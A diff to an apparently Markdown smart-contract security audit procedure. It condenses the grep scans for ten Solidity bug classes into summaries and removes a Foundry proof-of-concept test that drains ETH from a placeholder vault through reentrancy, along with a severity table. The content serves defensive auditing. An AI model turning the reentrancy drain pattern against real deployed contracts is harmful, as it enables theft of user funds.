@@ -81,204 +81,33 @@ Pre-dive signal checklist:
 - **Proxy/upgrade in use**: Always run Bug Class 10 checks regardless of other findings.
 - **Complex DeFi integrations (AMMs, lending protocols)**: Prioritize Bug Classes 5, 6, 8.
 
-### Step 2: Grep-pattern scan — Bug Class 1: Accounting State Desynchronization
+### Steps 2–11: Grep-pattern scans (Bug Classes 1–10)
 
-Accounting state desynchronization (28% of critical findings) occurs when a contract's internal accounting variables diverge from actual token balances or external state. Common pattern: using `balanceOf(address(this))` instead of a tracked internal variable, or updating state after an external call.
+> **Reference**: See [REFERENCE.md](REFERENCE.md) for the complete grep command blocks for all 10 bug classes (BC1 Accounting State Desynchronization through BC10 Proxy/Upgrade Issues).
 
-```bash
-echo "[*] Bug Class 1: Accounting State Desynchronization"
-rg -n "balanceOf\(address\(this\)\)" "$SRC" --include="*.sol" | tee "$OUTDIR/bc1_balance_of_this.txt"
-rg -n "\.transfer\(|\.transferFrom\(|\.safeTransfer\(" "$SRC" --include="*.sol" | tee "$OUTDIR/bc1_transfers.txt"
-# Flag: state update AFTER external call (CEI violation)
-rg -n -A5 "\.call\{" "$SRC" --include="*.sol" | grep -A5 "=" | tee "$OUTDIR/bc1_state_after_call.txt"
-echo "[*] Manual check: verify each transfer is reflected in an internal accounting variable"
-```
+Run each grep-pattern scan in order. Save output files to `$OUTDIR`. Manually confirm or dismiss each flagged result before creating a finding entry.
 
-### Step 3: Grep-pattern scan — Bug Class 2: Access Control
-
-Missing or incorrect access control on privileged functions. The sibling function rule: if function A has an access modifier (e.g. `onlyOwner`), every function that performs a similar privileged operation should also be protected.
-
-```bash
-echo "[*] Bug Class 2: Access Control"
-# Find all external/public functions
-rg -n "function .*(external|public)" "$SRC" --include="*.sol" | tee "$OUTDIR/bc2_public_functions.txt"
-# Find functions with no modifier
-rg -n "function .*(external|public) [^{]*\{" "$SRC" --include="*.sol" | grep -v "override\|view\|pure\|returns" | tee "$OUTDIR/bc2_no_modifier.txt"
-# Find privileged modifiers
-rg -n "onlyOwner\|onlyAdmin\|onlyRole\|requiresAuth\|Ownable" "$SRC" --include="*.sol" | tee "$OUTDIR/bc2_privileged_functions.txt"
-echo "[*] Manual check: apply sibling function rule — every admin-equivalent function must be guarded"
-```
-
-### Step 4: Grep-pattern scan — Bug Class 3: Incomplete Code Path
-
-Early returns, missing else branches, or unhandled states that allow code to skip critical logic such as fee collection, balance updates, or event emissions.
-
-```bash
-echo "[*] Bug Class 3: Incomplete Code Path"
-rg -n "return;" "$SRC" --include="*.sol" | tee "$OUTDIR/bc3_early_returns.txt"
-# Flag: if blocks without else where state change occurs
-rg -n -B2 -A10 "if \(" "$SRC" --include="*.sol" | grep -B5 "return\b" | tee "$OUTDIR/bc3_conditional_returns.txt"
-echo "[*] Manual check: trace each early return path — does it skip balance updates, fee accrual, or event emissions?"
-```
-
-### Step 5: Grep-pattern scan — Bug Class 4: Off-By-One
-
-Off-by-one errors (22% of high severity findings) in loop bounds, array indexing, token amount calculations, and timestamp/block comparisons.
-
-```bash
-echo "[*] Bug Class 4: Off-By-One"
-rg -n "< length\|<= length\|i < .*\.length\|i <= .*\.length" "$SRC" --include="*.sol" | tee "$OUTDIR/bc4_loop_bounds.txt"
-rg -n "\bblock\.timestamp\b" "$SRC" --include="*.sol" | tee "$OUTDIR/bc4_timestamps.txt"
-# Flag: comparisons using < vs <=
-rg -n ">=\s*[0-9]\|<=\s*[0-9]\|>\s*[0-9]\|<\s*[0-9]" "$SRC" --include="*.sol" | tee "$OUTDIR/bc4_numeric_comparisons.txt"
-echo "[*] Manual check: verify < vs <= in loop bounds, deadline checks, and amount validations"
-```
-
-### Step 6: Grep-pattern scan — Bug Class 5: Oracle Manipulation
-
-Price oracle attacks where spot prices from AMM pools (e.g. Uniswap `getReserves()`) are used directly without TWAP, allowing flash loan manipulation.
-
-```bash
-echo "[*] Bug Class 5: Oracle Manipulation"
-rg -n "getReserves\(\)\|token0\(\)\|token1\(\)" "$SRC" --include="*.sol" | tee "$OUTDIR/bc5_spot_price.txt"
-rg -n "price\|oracle\|getPrice\|latestAnswer\|latestRoundData" "$SRC" --include="*.sol" -i | tee "$OUTDIR/bc5_oracle_calls.txt"
-rg -n "consult\|observe\|TWAP\|twap" "$SRC" --include="*.sol" -i | tee "$OUTDIR/bc5_twap.txt"
-echo "[*] Manual check: if spot price used without TWAP, it is flash-loan manipulable"
-echo "[*] Manual check: Chainlink usage — check for stale price (latestRoundData round/updatedAt validation)"
-```
-
-### Step 7: Grep-pattern scan — Bug Class 6: ERC4626 Attacks
-
-ERC4626 vault inflation attacks (donate 1 wei to manipulate share price) and rounding direction errors that favor attacker over users.
-
-```bash
-echo "[*] Bug Class 6: ERC4626 Attacks"
-rg -n "ERC4626\|convertToShares\|convertToAssets\|previewDeposit\|previewMint\|previewWithdraw\|previewRedeem" "$SRC" --include="*.sol" | tee "$OUTDIR/bc6_erc4626.txt"
-# Flag rounding: mulDiv without explicit rounding direction
-rg -n "mulDiv\b" "$SRC" --include="*.sol" | tee "$OUTDIR/bc6_muldiv_rounding.txt"
-echo "[*] Manual check: deposits should round DOWN (fewer shares to user), withdrawals should round UP (more assets required)"
-echo "[*] Manual check: check for virtual shares/assets offset to mitigate inflation attack"
-```
-
-### Step 8: Grep-pattern scan — Bug Class 7: Reentrancy
-
-Cross-function reentrancy, cross-contract reentrancy, and read-only reentrancy where view functions are called mid-execution and return stale state.
-
-```bash
-echo "[*] Bug Class 7: Reentrancy"
-# Flag: external calls (ETH transfer, low-level call, token transfer) before state update
-rg -n "\.call\{value\|\.transfer\(\|\.send\(\|safeTransfer\b" "$SRC" --include="*.sol" | tee "$OUTDIR/bc7_external_calls.txt"
-# Flag: nonReentrant modifier usage
-rg -n "nonReentrant\|ReentrancyGuard" "$SRC" --include="*.sol" | tee "$OUTDIR/bc7_reentrancy_guard.txt"
-# Flag: missing nonReentrant on public functions that make external calls
-rg -n "function .*(external|public)" "$SRC" --include="*.sol" | grep -v nonReentrant | tee "$OUTDIR/bc7_unguarded_functions.txt"
-echo "[*] Manual check: CEI pattern — state changes BEFORE external calls"
-echo "[*] Manual check: read-only reentrancy — any view functions called in other protocols that read this contract's state mid-execution?"
-```
-
-### Step 9: Grep-pattern scan — Bug Class 8: Flash Loan Attacks
-
-Flash loan vectors beyond oracle manipulation: governance attacks (borrow tokens, vote, repay), liquidity attacks, and collateral manipulation.
-
-```bash
-echo "[*] Bug Class 8: Flash Loan Attacks"
-rg -n "flashLoan\|flashBorrow\|onFlashLoan\|executeOperation" "$SRC" --include="*.sol" | tee "$OUTDIR/bc8_flashloan.txt"
-rg -n "governance\|vote\|proposal\|quorum" "$SRC" --include="*.sol" -i | tee "$OUTDIR/bc8_governance.txt"
-echo "[*] Manual check: can token balance be flash-borrowed to manipulate governance votes in a single block?"
-echo "[*] Manual check: does the protocol use snapshot voting (e.g. OpenZeppelin ERC20Votes) to prevent this?"
-```
-
-### Step 10: Grep-pattern scan — Bug Class 9: Signature Replay
-
-Missing nonce or chain ID in signed messages allows replay of valid signatures across transactions or chains.
-
-```bash
-echo "[*] Bug Class 9: Signature Replay"
-rg -n "ecrecover\|ECDSA\.recover\|SignatureChecker" "$SRC" --include="*.sol" | tee "$OUTDIR/bc9_signatures.txt"
-# Flag: nonce and chainId usage
-rg -n "nonce\|chainId\|block\.chainid" "$SRC" --include="*.sol" -i | tee "$OUTDIR/bc9_nonce_chainid.txt"
-# Flag: EIP-712 domain separator
-rg -n "DOMAIN_SEPARATOR\|EIP712\|domainSeparator" "$SRC" --include="*.sol" | tee "$OUTDIR/bc9_eip712.txt"
-echo "[*] Manual check: every signed message must include nonce + chainId or equivalent replay protection"
-```
-
-### Step 11: Grep-pattern scan — Bug Class 10: Proxy/Upgrade Issues
-
-Storage collision between proxy and implementation, uninitialized implementation contracts (can be self-destructed or taken over), and unsafe delegatecall targets.
-
-```bash
-echo "[*] Bug Class 10: Proxy/Upgrade Issues"
-rg -n "delegatecall\|Proxy\|UUPS\|TransparentUpgradeableProxy\|BeaconProxy" "$SRC" --include="*.sol" | tee "$OUTDIR/bc10_proxy.txt"
-rg -n "initialize\|initializer\|__.*_init\b" "$SRC" --include="*.sol" | tee "$OUTDIR/bc10_initializers.txt"
-rg -n "selfdestruct\|suicide(" "$SRC" --include="*.sol" | tee "$OUTDIR/bc10_selfdestruct.txt"
-echo "[*] Manual check: implementation contract initializer should be called on deployment (not left uninitialized)"
-echo "[*] Manual check: storage layout of proxy and implementation must not collide (use storage gaps)"
-```
+Bug class descriptions:
+- **BC1** Accounting State Desynchronization (28% of critical findings) — internal accounting diverges from actual balances
+- **BC2** Access Control — missing modifiers on privileged functions; apply the sibling function rule
+- **BC3** Incomplete Code Path — early returns that skip fee collection, balance updates, or event emissions
+- **BC4** Off-By-One (22% of high findings) — `<` vs `<=` in loop bounds, deadlines, and amount checks
+- **BC5** Oracle Manipulation — spot price from `getReserves()` without TWAP; Chainlink staleness check
+- **BC6** ERC4626 Attacks — vault inflation via 1-wei donation; rounding direction errors
+- **BC7** Reentrancy — CEI violations; cross-function and read-only reentrancy
+- **BC8** Flash Loan Attacks — governance manipulation, liquidity attacks, collateral manipulation
+- **BC9** Signature Replay — missing nonce or chainId in signed messages
+- **BC10** Proxy/Upgrade Issues — storage collision, uninitialized implementations, unsafe delegatecall
 
 ### Step 12: Write Foundry PoC test for confirmed findings
 
-For each finding confirmed in Steps 2–11, write a Foundry test that reproduces the vulnerability. Use a mainnet fork if the protocol interacts with live DeFi primitives.
+> **Reference**: See [REFERENCE.md](REFERENCE.md) for the complete Foundry PoC template (reentrancy drain example) and the `forge test` run command.
 
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-
-// Save as: test/PoC_<BugClass>_<FindingTitle>.t.sol
-// Run with: forge test --match-path "test/PoC_*" -vvvv [--fork-url $SECSKILL_RPC_URL]
-
-import "forge-std/Test.sol";
-import "../src/VulnerableContract.sol";
-
-contract PoC_Reentrancy_WithdrawDrain is Test {
-    VulnerableContract target;
-    address attacker = makeAddr("attacker");
-
-    function setUp() public {
-        // Deploy or fork target
-        target = new VulnerableContract();
-        // Seed with ETH to make the PoC impactful
-        vm.deal(address(target), 100 ether);
-        vm.deal(attacker, 1 ether);
-    }
-
-    function test_PoC_ReentrancyDrain() public {
-        vm.startPrank(attacker);
-
-        // Step 1: Deposit initial amount
-        target.deposit{value: 1 ether}();
-
-        uint256 balanceBefore = address(attacker).balance;
-
-        // Step 2: Trigger reentrant withdraw
-        target.withdraw();
-
-        uint256 balanceAfter = address(attacker).balance;
-        uint256 stolen = balanceAfter - balanceBefore;
-
-        emit log_named_uint("ETH stolen", stolen);
-        assertGt(stolen, 1 ether, "PoC: drained more than deposited");
-
-        vm.stopPrank();
-    }
-
-    // Attacker contract fallback re-enters withdraw
-    receive() external payable {
-        if (address(target).balance > 0) {
-            target.withdraw();
-        }
-    }
-}
-```
-
-```bash
-# Run the PoC
-cd "$SECSKILL_CONTRACT_DIR"
-forge test --match-path "test/PoC_*" -vvvv \
-  ${SECSKILL_RPC_URL:+--fork-url "$SECSKILL_RPC_URL"} \
-  | tee "$OUTDIR/poc_results.txt"
-```
+For each confirmed CRITICAL or HIGH finding, write a Foundry test at `test/PoC_<BugClass>_<FindingTitle>.t.sol`. Use a mainnet fork (`--fork-url $SECSKILL_RPC_URL`) when the protocol interacts with live DeFi primitives.
 
 ### Step 13: Assess severity and generate findings report
+
+> **Reference**: See [REFERENCE.md](REFERENCE.md) for the severity table (CRITICAL/HIGH/MEDIUM/LOW/INFO) and the finding detail template.
 
 ```markdown
 ## Smart Contract Audit Findings: <PROTOCOL_NAME>
@@ -287,16 +116,6 @@ forge test --match-path "test/PoC_*" -vvvv \
 **Audit date**: <YYYY-MM-DD>
 **Source**: <SECSKILL_CONTRACT_DIR>
 
-### Finding Severity Criteria
-
-| Severity | Criteria |
-|----------|----------|
-| CRITICAL | Direct loss of funds, unauthorized token minting, or complete protocol takeover |
-| HIGH | Significant fund loss under realistic conditions, governance manipulation |
-| MEDIUM | Partial fund loss, griefing, or DoS under specific conditions |
-| LOW | Best-practice violations, minor economic inefficiencies |
-| INFO | Gas optimizations, code quality observations |
-
 ### Findings
 
 | ID | Bug Class | Title | Severity | PoC Test |
@@ -304,16 +123,6 @@ forge test --match-path "test/PoC_*" -vvvv \
 | F-001 | BC7 Reentrancy | Cross-function reentrancy in withdraw() allows ETH drain | CRITICAL | PoC_Reentrancy_WithdrawDrain.t.sol |
 | F-002 | BC5 Oracle | Spot price from getReserves() manipulable via flash loan | HIGH | PoC_Oracle_FlashLoan.t.sol |
 | F-003 | BC9 Signature | Missing nonce in permit() signature allows replay | MEDIUM | PoC_SignatureReplay.t.sol |
-
-### Finding Detail Template
-
-**[CRITICAL] F-001: Reentrancy in withdraw()**
-- **File**: `src/Vault.sol:142`
-- **Bug Class**: BC7 — Reentrancy
-- **Description**: `withdraw()` transfers ETH before updating `balances[msg.sender]`, allowing a malicious contract to re-enter and drain the vault.
-- **Impact**: Complete loss of all ETH held in the contract.
-- **PoC**: `test/PoC_Reentrancy_WithdrawDrain.t.sol` — test passes, confirming exploitability.
-- **Remediation**: Apply Checks-Effects-Interactions: update `balances[msg.sender] = 0` before the ETH transfer. Add `nonReentrant` modifier from OpenZeppelin ReentrancyGuard as defense-in-depth.
 ```
 
 ## Done when
